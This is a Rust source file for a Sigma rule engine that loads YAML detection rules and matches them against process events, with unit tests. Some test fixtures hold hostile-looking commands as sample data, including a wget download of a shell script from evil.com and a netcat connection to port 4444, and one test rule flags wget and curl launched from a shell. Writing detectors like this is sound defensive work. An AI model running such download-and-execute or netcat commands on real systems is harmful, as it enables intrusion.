//! K-XRO-CS-SIG-001 — Sigma rule evaluator (standalone).
//!
//! Full Sigma YAML rule loader and evaluation engine.  Parses `.yml` / `.yaml`
//! Sigma rules from a directory tree, then evaluates them against
//! `ProcessEvent` telemetry records.
//!
//! # Supported detection features
//! * Field keyword matching (exact / contains / startswith / endswith / re)
//! * `contains|all` — all patterns must be found in the field value
//! * Multi-value lists (OR semantics by default)
//! * Condition algebra: `all of them`, `1 of them`, `selection`, `filter`,
//!   binary `and` / `or`, and unary `not`
//!
//! # Cargo dependencies
//! ```toml
//! serde       = { version = "1", features = ["derive"] }
//! serde_yaml  = "0.9"
//! regex       = "1"
//! anyhow      = "1"
//! tracing     = "0.1"
//! ```

use anyhow::{Context, Result};
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;
use std::path::Path;
use tracing::{debug, info, warn};

// ─────────────────────────────────────────────────────────────────────────────
// Public event type that the engine evaluates against
// ─────────────────────────────────────────────────────────────────────────────

/// Minimal process event record (subset of OCSF Process Activity 4007).
#[derive(Debug, Clone, Default)]
pub struct ProcessEvent {
    pub exe: String,
    pub cmdline: String,
    pub parent_exe: String,
    pub user: String,
    pub uid: u32,
    pub pid: u32,
    /// Arbitrary key→value metadata for field-level matching.
    pub fields: HashMap<String, String>,
}

impl ProcessEvent {
    /// Resolve a Sigma field name to its value in this event.
    fn field_value(&self, field: &str) -> Option<&str> {
        match field.to_lowercase().as_str() {
            "image" | "process.image" | "exe" => Some(&self.exe),
            "commandline" | "process.command_line" | "cmdline" => Some(&self.cmdline),
            "parentimage" | "parent_image" | "parent_exe" => Some(&self.parent_exe),
            "user" | "user.name" => Some(&self.user),
            _ => self.fields.get(field).map(|s| s.as_str()),
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Sigma YAML structures
// ─────────────────────────────────────────────────────────────────────────────

/// A single Sigma rule parsed from YAML.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SigmaRule {
    #[serde(default)]
    pub id: String,
    #[serde(default)]
    pub title: String,
    #[serde(default)]
    pub status: String,
    #[serde(default)]
    pub level: String,
    #[serde(default)]
    pub tags: Vec<String>,
    pub detection: SigmaDetection,
    /// Filename the rule was loaded from (set by the engine, not YAML).
    #[serde(skip)]
    pub filename: String,
}

/// The `detection:` block of a Sigma rule.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SigmaDetection {
    /// Named detection groups, e.g. `selection:`, `filter:`.
    #[serde(flatten)]
    pub groups: HashMap<String, serde_yaml::Value>,
    /// Condition expression string, e.g. `"selection and not filter"`.
    pub condition: String,
}

/// Scalar or list value within a detection group.
#[derive(Debug, Clone)]
pub enum SigmaValue {
    Single(String),
    Multiple(Vec<String>),
}

impl SigmaValue {
    fn from_yaml(val: &serde_yaml::Value) -> Self {
        match val {
            serde_yaml::Value::String(s) => SigmaValue::Single(s.clone()),
            serde_yaml::Value::Number(n) => SigmaValue::Single(n.to_string()),
            serde_yaml::Value::Bool(b) => SigmaValue::Single(b.to_string()),
            serde_yaml::Value::Sequence(seq) => {
                let items = seq
                    .iter()
                    .filter_map(|v| v.as_str().map(|s| s.to_string()))
                    .collect();
                SigmaValue::Multiple(items)
            }
            _ => SigmaValue::Single(String::new()),
        }
    }

    fn values(&self) -> Vec<&str> {
        match self {
            SigmaValue::Single(s) => vec![s.as_str()],
            SigmaValue::Multiple(v) => v.iter().map(|s| s.as_str()).collect(),
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// SigmaMatch — returned when a rule fires
// ─────────────────────────────────────────────────────────────────────────────

/// A rule match result.
#[derive(Debug, Clone, Serialize)]
pub struct SigmaMatch {
    pub rule_id: String,
    pub title: String,
    pub level: String,
    pub tags: Vec<String>,
    pub filename: String,
}

// ─────────────────────────────────────────────────────────────────────────────
// SigmaEngine
// ─────────────────────────────────────────────────────────────────────────────

/// Holds a compiled set of Sigma rules and evaluates them against events.
pub struct SigmaEngine {
    rules: Vec<SigmaRule>,
}

impl SigmaEngine {
    /// Load all `.yml` and `.yaml` Sigma rule files under `dir` recursively.
    /// Files that fail to parse are logged and skipped.
    pub fn load_from_dir(dir: &str) -> Result<Self> {
        let path = Path::new(dir);
        if !path.exists() {
            info!(dir, "Sigma rule directory not found — engine empty");
            return Ok(Self { rules: Vec::new() });
        }
        let mut rules = Vec::new();
        load_yaml_recursive(path, &mut rules);
        info!(count = rules.len(), dir, "Sigma rules loaded");
        Ok(Self { rules })
    }

    /// Build an engine from an in-memory YAML string (useful for tests).
    pub fn from_yaml(yaml: &str) -> Result<Self> {
        let mut rule: SigmaRule = serde_yaml::from_str(yaml).context("parse rule yaml")?;
        rule.filename = "<inline>".to_string();
        Ok(Self { rules: vec![rule] })
    }

    /// Evaluate all loaded rules against `event`.
    /// Returns a `Vec<SigmaMatch>` of every rule that matches.
    pub fn evaluate(&self, event: &ProcessEvent) -> Vec<SigmaMatch> {
        let mut matches = Vec::new();
        for rule in &self.rules {
            if matches_rule(rule, event) {
                matches.push(SigmaMatch {
                    rule_id: rule.id.clone(),
                    title: rule.title.clone(),
                    level: rule.level.clone(),
                    tags: rule.tags.clone(),
                    filename: rule.filename.clone(),
                });
            }
        }
        matches
    }

    /// Number of loaded rules.
    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Rule evaluation internals
// ─────────────────────────────────────────────────────────────────────────────

/// Returns `true` if the rule fires for the given event.
fn matches_rule(rule: &SigmaRule, event: &ProcessEvent) -> bool {
    // Resolve which named groups matched
    let mut group_results: HashMap<String, bool> = HashMap::new();
    for (name, val) in &rule.detection.groups {
        if name == "condition" || name == "timeframe" {
            continue;
        }
        group_results.insert(name.clone(), evaluate_group(val, event));
    }
    evaluate_condition(&rule.detection.condition, &group_results)
}

/// Evaluate one detection group (a map of field→patterns).
fn evaluate_group(val: &serde_yaml::Value, event: &ProcessEvent) -> bool {
    match val {
        // A sequence of maps means OR across maps
        serde_yaml::Value::Sequence(seq) => {
            seq.iter().any(|item| evaluate_group(item, event))
        }
        // A mapping: each key is a field name (with optional modifier), all
        // key-value pairs must match (AND semantics within one map).
        serde_yaml::Value::Mapping(map) => {
            map.iter().all(|(k, v)| {
                let field_key = k.as_str().unwrap_or("");
                let sv = SigmaValue::from_yaml(v);
                matches_field(field_key, &sv, event)
            })
        }
        _ => false,
    }
}

/// Evaluate the condition string against the map of group name → bool.
///
/// Supported grammar:
/// * `all of them`  — all groups are true
/// * `1 of them`    — at least one group is true
/// * `<name>`       — single group reference
/// * `not <expr>`   — logical NOT
/// * `<a> and <b>`  — logical AND  (left-associative, lower precedence)
/// * `<a> or <b>`   — logical OR   (lowest precedence)
pub fn evaluate_condition(condition: &str, groups: &HashMap<String, bool>) -> bool {
    let cond = condition.trim().to_lowercase();
    eval_or(&cond, groups)
}

fn eval_or(s: &str, groups: &HashMap<String, bool>) -> bool {
    // Split on top-level " or " (not inside parens — simplified)
    let parts: Vec<&str> = split_top_level(s, " or ");
    if parts.len() > 1 {
        return parts.iter().any(|p| eval_and(p.trim(), groups));
    }
    eval_and(s, groups)
}

fn eval_and(s: &str, groups: &HashMap<String, bool>) -> bool {
    let parts: Vec<&str> = split_top_level(s, " and ");
    if parts.len() > 1 {
        return parts.iter().all(|p| eval_not(p.trim(), groups));
    }
    eval_not(s, groups)
}

fn eval_not(s: &str, groups: &HashMap<String, bool>) -> bool {
    let s = s.trim();
    if let Some(inner) = s.strip_prefix("not ") {
        return !eval_atom(inner.trim(), groups);
    }
    eval_atom(s, groups)
}

fn eval_atom(s: &str, groups: &HashMap<String, bool>) -> bool {
    let s = s.trim();
    // Parenthesised sub-expression
    if s.starts_with('(') && s.ends_with(')') {
        return eval_or(&s[1..s.len() - 1], groups);
    }
    // Special keywords
    match s {
        "all of them" => groups.values().all(|&v| v),
        "1 of them" | "any of them" => groups.values().any(|&v| v),
        _ => {
            // "all of <prefix>*" or "1 of <prefix>*"
            if let Some(rest) = s.strip_prefix("all of ") {
                let prefix = rest.trim_end_matches('*');
                return groups
                    .iter()
                    .filter(|(k, _)| k.starts_with(prefix))
                    .all(|(_, &v)| v);
            }
            if let Some(rest) = s.strip_prefix("1 of ") {
                let prefix = rest.trim_end_matches('*');
                return groups
                    .iter()
                    .filter(|(k, _)| k.starts_with(prefix))
                    .any(|(_, &v)| v);
            }
            // Plain group name lookup
            *groups.get(s).unwrap_or(&false)
        }
    }
}

/// Split `s` on `sep` but only at the top level (paren depth 0).
fn split_top_level<'a>(s: &'a str, sep: &str) -> Vec<&'a str> {
    let mut depth = 0i32;
    let mut last = 0;
    let mut parts = Vec::new();
    let sep_len = sep.len();
    let bytes = s.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    while i < len {
        if bytes[i] == b'(' {
            depth += 1;
            i += 1;
        } else if bytes[i] == b')' {
            depth -= 1;
            i += 1;
        } else if depth == 0 && s[i..].starts_with(sep) {
            parts.push(&s[last..i]);
            i += sep_len;
            last = i;
        } else {
            i += 1;
        }
    }
    parts.push(&s[last..]);
    parts
}

// ─────────────────────────────────────────────────────────────────────────────
// Field modifier matching
// ─────────────────────────────────────────────────────────────────────────────

/// Match a field-with-optional-modifier against the event.
///
/// Modifier syntax: `FieldName|modifier` e.g. `CommandLine|contains`
fn matches_field(field_key: &str, sv: &SigmaValue, event: &ProcessEvent) -> bool {
    // Split field|modifier
    let (field, modifier) = if let Some(pos) = field_key.find('|') {
        (&field_key[..pos], &field_key[pos + 1..])
    } else {
        (field_key, "")
    };

    let event_value = match event.field_value(field) {
        Some(v) => v.to_lowercase(),
        None => return false,
    };

    let patterns = sv.values();

    match modifier {
        // ── Multi-value modifiers ──────────────────────────────────────────
        "contains|all" => {
            // All patterns must be present in the field value
            patterns
                .iter()
                .all(|p| event_value.contains(&p.to_lowercase()))
        }
        "startswith|all" => patterns
            .iter()
            .all(|p| event_value.starts_with(&p.to_lowercase())),
        "endswith|all" => patterns
            .iter()
            .all(|p| event_value.ends_with(&p.to_lowercase())),

        // ── Single modifiers (OR across patterns) ─────────────────────────
        "" | "equals" => patterns
            .iter()
            .any(|p| event_value == p.to_lowercase()),
        "contains" => patterns
            .iter()
            .any(|p| event_value.contains(&p.to_lowercase())),
        "startswith" => patterns
            .iter()
            .any(|p| event_value.starts_with(&p.to_lowercase())),
        "endswith" => patterns
            .iter()
            .any(|p| event_value.ends_with(&p.to_lowercase())),
        "re" => patterns.iter().any(|p| {
            Regex::new(p)
                .map(|re| re.is_match(&event_value))
                .unwrap_or(false)
        }),
        "windash" => {
            // Windows dash normalisation: treat - and / as equivalent
            patterns.iter().any(|p| {
                let normalised = event_value.replace('/', "-").replace('\\', "/");
                normalised.contains(&p.to_lowercase().replace('/', "-"))
            })
        }
        other => {
            // Unknown modifier — fall back to contains for robustness
            debug!(modifier = other, field, "Unknown Sigma field modifier — using contains");
            patterns
                .iter()
                .any(|p| event_value.contains(&p.to_lowercase()))
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Directory recursive loader
// ─────────────────────────────────────────────────────────────────────────────

fn load_yaml_recursive(dir: &Path, rules: &mut Vec<SigmaRule>) {
    let entries = match fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return,
    };
    for entry in entries.flatten() {
        let p = entry.path();
        if p.is_dir() {
            load_yaml_recursive(&p, rules);
        } else {
            let ext = p.extension().and_then(|e| e.to_str()).unwrap_or("").to_lowercase();
            if ext == "yml" || ext == "yaml" {
                match fs::read_to_string(&p) {
                    Ok(content) => match serde_yaml::from_str::<SigmaRule>(&content) {
                        Ok(mut rule) => {
                            rule.filename = p.to_string_lossy().to_string();
                            rules.push(rule);
                        }
                        Err(e) => {
                            warn!(file = %p.display(), error = %e, "Sigma parse error — skipping");
                        }
                    },
                    Err(e) => {
                        warn!(file = %p.display(), error = %e, "Sigma read error — skipping");
                    }
                }
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn make_event(exe: &str, cmdline: &str) -> ProcessEvent {
        ProcessEvent {
            exe: exe.to_string(),
            cmdline: cmdline.to_string(),
            ..Default::default()
        }
    }

    const SIMPLE_RULE: &str = r#"
id: TEST-001
title: Test bash execution
status: test
level: medium
tags:
  - attack.execution
detection:
  selection:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains:
      - 'wget'
      - 'curl'
  condition: selection
"#;

    const AND_NOT_RULE: &str = r#"
id: TEST-002
title: Suspicious but not allowed
status: test
level: high
detection:
  selection:
    Image|contains: 'python'
  filter:
    CommandLine|contains: 'setup.py'
  condition: selection and not filter
"#;

    #[test]
    fn simple_rule_matches() {
        let engine = SigmaEngine::from_yaml(SIMPLE_RULE).unwrap();
        let ev = make_event("/bin/bash", "wget http://evil.com/shell.sh");
        let hits = engine.evaluate(&ev);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].rule_id, "TEST-001");
    }

    #[test]
    fn simple_rule_no_match_wrong_cmdline() {
        let engine = SigmaEngine::from_yaml(SIMPLE_RULE).unwrap();
        let ev = make_event("/bin/bash", "ls -la");
        let hits = engine.evaluate(&ev);
        assert!(hits.is_empty());
    }

    #[test]
    fn simple_rule_no_match_wrong_exe() {
        let engine = SigmaEngine::from_yaml(SIMPLE_RULE).unwrap();
        let ev = make_event("/usr/bin/python3", "wget http://evil.com");
        let hits = engine.evaluate(&ev);
        assert!(hits.is_empty(), "python3 does not end with /bash or /sh");
    }

    #[test]
    fn and_not_filter_excluded() {
        let engine = SigmaEngine::from_yaml(AND_NOT_RULE).unwrap();
        // Matches selection but also filter → should NOT fire
        let ev = make_event("/usr/bin/python3", "python3 setup.py install");
        assert!(engine.evaluate(&ev).is_empty());
    }

    #[test]
    fn and_not_no_filter_fires() {
        let engine = SigmaEngine::from_yaml(AND_NOT_RULE).unwrap();
        let ev = make_event("/usr/bin/python3", "python3 evil_script.py");
        let hits = engine.evaluate(&ev);
        assert_eq!(hits.len(), 1, "should fire when filter not triggered");
    }

    #[test]
    fn evaluate_condition_all_of_them() {
        let mut g = HashMap::new();
        g.insert("a".into(), true);
        g.insert("b".into(), true);
        assert!(evaluate_condition("all of them", &g));
        g.insert("c".into(), false);
        assert!(!evaluate_condition("all of them", &g));
    }

    #[test]
    fn evaluate_condition_1_of_them() {
        let mut g = HashMap::new();
        g.insert("a".into(), false);
        g.insert("b".into(), true);
        assert!(evaluate_condition("1 of them", &g));
    }

    #[test]
    fn evaluate_condition_not() {
        let mut g = HashMap::new();
        g.insert("sel".into(), true);
        g.insert("flt".into(), false);
        assert!(evaluate_condition("sel and not flt", &g));
        g.insert("flt".into(), true);
        assert!(!evaluate_condition("sel and not flt", &g));
    }

    #[test]
    fn containsall_modifier() {
        let rule_yaml = r#"
id: CTEST
title: contains|all
status: test
level: low
detection:
  selection:
    CommandLine|contains|all:
      - 'ping'
      - '127.0.0.1'
  condition: selection
"#;
        let engine = SigmaEngine::from_yaml(rule_yaml).unwrap();
        let ev1 = make_event("/bin/ping", "ping 127.0.0.1");
        assert_eq!(engine.evaluate(&ev1).len(), 1);
        let ev2 = make_event("/bin/ping", "ping 8.8.8.8");
        assert!(engine.evaluate(&ev2).is_empty());
    }

    #[test]
    fn re_modifier() {
        let rule_yaml = r#"
id: RE-001
title: Regex test
status: test
level: low
detection:
  selection:
    CommandLine|re: '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'
  condition: selection
"#;
        let engine = SigmaEngine::from_yaml(rule_yaml).unwrap();
        let ev = make_event("/bin/nc", "nc 10.0.0.1 4444");
        assert_eq!(engine.evaluate(&ev).len(), 1);
    }

    #[test]
    fn missing_dir_returns_empty_engine() {
        let engine = SigmaEngine::load_from_dir("/nonexistent/sigma/rules").unwrap();
        assert_eq!(engine.rule_count(), 0);
    }

    #[test]
    fn rule_count_correct() {
        let engine = SigmaEngine::from_yaml(SIMPLE_RULE).unwrap();
        assert_eq!(engine.rule_count(), 1);
    }
}
